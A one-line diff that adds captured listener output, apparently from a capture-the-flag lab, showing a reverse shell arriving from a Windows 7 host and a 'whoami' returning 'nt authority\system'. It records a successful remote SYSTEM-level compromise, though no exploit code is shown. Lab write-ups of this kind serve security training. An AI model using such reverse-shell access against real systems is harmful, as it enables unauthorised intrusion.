@@ -1,0 +1,1 @@
+connect to [10.10.14.14] from (UNKNOWN) [10.10.10.40] 49162 Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\Windows\system32>whoami nt authority\system
